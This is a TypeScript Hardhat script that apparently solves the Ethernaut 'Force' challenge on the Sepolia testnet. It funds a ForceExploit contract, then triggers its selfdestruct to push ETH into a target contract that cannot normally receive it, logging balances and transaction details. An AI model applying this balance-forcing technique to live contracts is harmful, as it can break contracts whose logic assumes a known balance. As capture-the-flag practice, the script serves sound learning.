import { ethers } from "hardhat";

/**
 * Execute the attack on the Force contract by sending ETH to the ForceExploit contract
 * and then calling the attack method to selfdestruct and force ETH to the target
 * 
 * Usage: 
 * npx hardhat run scripts/level-07-force/execute-force-exploit.ts --network sepolia
 * CONTRACT_ADDRESS=0xYourAddress npx hardhat run scripts/level-07-force/execute-force-exploit.ts --network sepolia
 */
async function main() {
  // Get contract address from environment variable or use default
  const defaultAddress = "0xD404840fEB422d46BD63Cf2Cd748A488e78Ec390"; // Replace with your actual default address
  const contractAddress = process.env.CONTRACT_ADDRESS || defaultAddress;
  
  console.log(`Using ForceExploit contract address: ${contractAddress}`);
  
  // Get the contract factory for ForceExploit
  const ForceExploit = await ethers.getContractFactory("ForceExploit");
  
  // Connect to the deployed contract
  const forceExploit = ForceExploit.attach(contractAddress);
  
  console.log(`Connected to ForceExploit contract at: ${contractAddress}`);
  
  const [deployer] = await ethers.getSigners();
  console.log(`Attacker address: ${deployer.address}`);

  try {
    // Check the initial target balance
    console.log("Checking initial target balance...");
    const initialBalance = await forceExploit.getFunction("getTargetBalance")();
    console.log(`Initial target balance: ${ethers.formatEther(initialBalance)} ETH`);
    
    // Get the target contract address
    const target = await forceExploit.getFunction("target")();
    console.log(`Target contract address: ${target}`);
    
    // Send some ETH to the ForceExploit contract
    console.log("Sending 0.001 ETH to ForceExploit contract...");
    const sendEthTx = await deployer.sendTransaction({
      to: contractAddress,
      value: ethers.parseEther("0.001"), // 0.001 ETH
    });
    
    // Wait for the transaction to be mined
    console.log("Waiting for ETH transfer transaction to be mined...");
    await sendEthTx.wait();
    
    // Check the ForceExploit contract balance
    const exploitBalance = await ethers.provider.getBalance(contractAddress);
    console.log(`ForceExploit contract balance: ${ethers.formatEther(exploitBalance)} ETH`);
    
    // Execute the attack
    console.log("Executing attack...");
    const attackTx = await forceExploit.getFunction("attack")();
    
    // Wait for the transaction to be mined
    console.log("Waiting for attack transaction to be mined...");
    const attackReceipt = await attackTx.wait();
    
    // Since the ForceExploit contract selfdestructs, we need to check the target balance directly
    // Using the provider to get the balance
    const finalBalance = await ethers.provider.getBalance(target);
    console.log(`Final target balance: ${ethers.formatEther(finalBalance)} ETH`);
    
    // Check if the attack was successful
    if (finalBalance > 0n) {
      console.log("\nExploit successful! The Force contract now has ETH.");
    } else {
      console.log("\nExploit failed. The Force contract still has 0 ETH.");
    }
    
    // Make sure receipt is not null before accessing its properties
    if (attackReceipt) {
      console.log(`\nAttack transaction details:`);
      console.log(`Hash: ${attackReceipt.hash}`);
      console.log(`Gas used: ${attackReceipt.gasUsed.toString()}`);
      console.log(`Block number: ${attackReceipt.blockNumber}`);
    }
  } catch (error) {
    console.error("\nError executing exploit:", error);
    process.exitCode = 1;
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
